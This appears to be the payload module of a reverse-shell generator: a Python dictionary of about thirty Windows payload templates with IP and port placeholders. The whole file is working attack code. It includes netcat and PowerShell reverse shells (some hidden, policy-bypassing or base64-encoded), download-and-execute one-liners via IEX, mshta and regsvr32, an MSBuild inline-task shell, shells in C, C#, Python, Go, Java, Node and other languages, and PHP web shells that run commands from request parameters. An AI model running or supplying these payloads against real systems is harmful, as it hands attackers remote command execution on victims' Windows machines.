# Windows Reverse Shell Payloads
# All payloads use {ip} and {port} placeholders
# Using double backslashes for Windows paths to avoid SyntaxWarnings

WINDOWS_PAYLOADS = {
    "nc.exe -e": "nc.exe {ip} {port} -e cmd.exe",
    
    "ncat.exe -e": "ncat.exe {ip} {port} -e cmd.exe",
    
    "PowerShell #1": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
    
    "PowerShell #2": """powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()" """,
    
    "PowerShell #3 (Base64)": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBpAHAAfQAiACwAewBwAG8AcgB0AH0AKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=",
    
    "PowerShell #4 (TCP)": """$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
    
    "PowerShell #5 (IEX)": "IEX(IWR http://{ip}:{port}/shell.ps1 -UseBasicParsing)",
    
    "C Windows": """#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "{ip}";
int port = {port};
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main()
{{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip_addr);
    
    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    
    TCHAR cmd[255] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    
    return 0;
}}""",
    
    "C# TCP Client Windows": """using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ConnectBack {{
    public class Program {{
        static StreamWriter streamWriter;

        public static void Main(string[] args) {{
            using(TcpClient client = new TcpClient("{ip}", {port})) {{
                using(Stream stream = client.GetStream()) {{
                    using(StreamReader rdr = new StreamReader(stream)) {{
                        streamWriter = new StreamWriter(stream);
                        
                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true) {{
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }}
                    }}
                }}
            }}
        }}

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) {{
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data)) {{
                try {{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }} catch (Exception err) {{ }}
            }}
        }}
    }}
}}""",
    
    "C# PowerShell": """using System;
using System.Diagnostics;

namespace BackConnect {{
    class ReversePowerShell {{
        public static void Main(string[] args) {{
            Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "powershell.exe";
            proc.StartInfo.Arguments = "-nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\"";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
        }}
    }}
}}""",
    
    "PHP PentestMonkey Windows": "php -r \"$sock=fsockopen('{ip}',{port});exec('cmd.exe <&3 >&3 2>&3');\"",
    
    "PHP Ivan Sincek Windows": "php -r \"$sock=fsockopen('{ip}',{port});$proc=proc_open('cmd.exe',array(0=>$sock,1=>$sock,2=>$sock),$pipes);\"",
    
    "PHP cmd Windows": """<?php if(isset($_REQUEST['cmd'])){{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }}?>""",
    
    "PHP cmd 2 Windows": """<?php if(isset($_REQUEST['cmd'])){{ $cmd = ($_REQUEST['cmd']); exec($cmd, $output); foreach($output as $line){{ echo $line."<br>"; }} die; }}?>""",
    
    "PHP cmd small Windows": "<?=`$_GET[0]`?>",
    
    "PHP system Windows": "<?php system($_GET['cmd']);?>",
    
    "PHP ` Windows": "<?php echo `$_GET['cmd']`;?>",
    
    "Python Windows": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe']);\"",
    
    "Python3 Windows": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe']);\"",
    
    "Ruby Windows": "ruby -rsocket -e \"c=TCPSocket.new('{ip}',{port});while(cmd=c.gets);IO.popen(cmd,'r'){{|io|c.print io.read}}end\"",
    
    "Perl Windows": "perl -MIO -e \"$c=new IO::Socket::INET(PeerAddr,'{ip}:{port}');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\"",
    
    "Lua Windows": "lua -e \"local host, port = '{ip}', {port} local socket = require('socket') local tcp = socket.tcp() local io = require('io') tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read('*a') f:close() tcp:send(s) if status == 'closed' then break end end tcp:close()\"",
    
    "Golang Windows": "echo package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}} > revshell.go && go run revshell.go",
    
    "Groovy": """String host="{ip}";
int port={port};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();""",
    
    "ConPtyShell": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
    
    "Mshta": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -c \\\"\"IEX(New-Object Net.WebClient).downloadString('http://{ip}:{port}/shell.ps1')\\\"\"\"\", 0:close\")",
    
    "Regsvr32": "regsvr32 /s /n /u /i:http://{ip}:{port}/file.sct scrobj.dll",
    
    "MSBuild": """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="RevShell">
    <RevShellTask/>
  </Target>
  <UsingTask TaskName="RevShellTask" TaskFactory="CodeTaskFactory" AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Net;
          using System.Net.Sockets;
          using System.Diagnostics;
          using System.IO;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class RevShellTask : Task {{
            public override bool Execute() {{
              using(TcpClient client = new TcpClient("{ip}", {port})) {{
                using(Stream stream = client.GetStream()) {{
                  using(StreamReader rdr = new StreamReader(stream)) {{
                    StreamWriter streamWriter = new StreamWriter(stream);
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += (sender, args) => {{
                      if (!String.IsNullOrEmpty(args.Data)) {{
                        streamWriter.WriteLine(args.Data);
                        streamWriter.Flush();
                      }}
                    }};
                    p.Start();
                    p.BeginOutputReadLine();
                    while(true) {{
                      string input = rdr.ReadLine();
                      p.StandardInput.WriteLine(input);
                    }}
                  }}
                }}
              }}
              return true;
            }}
          }}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>""",
    
    "node.js Windows": "require('child_process').exec('nc.exe -e cmd.exe {ip} {port}')",
    
    "node.js #2 Windows": """(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();""",
    
    "Java Windows": """Runtime r = Runtime.getRuntime();
Process p = r.exec("cmd.exe");
Socket s = new Socket("{ip}", {port});
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {{
  while (pi.available() > 0) so.write(pi.read());
  while (pe.available() > 0) so.write(pe.read());
  while (si.available() > 0) po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {{ p.exitValue(); break; }} catch (Exception e) {{}}
}}
p.destroy();
s.close();""",
    
    "Haskell Windows": """module Main where
import System.Process
main = callCommand "cmd.exe /c nc.exe {ip} {port} -e cmd.exe" """,
}
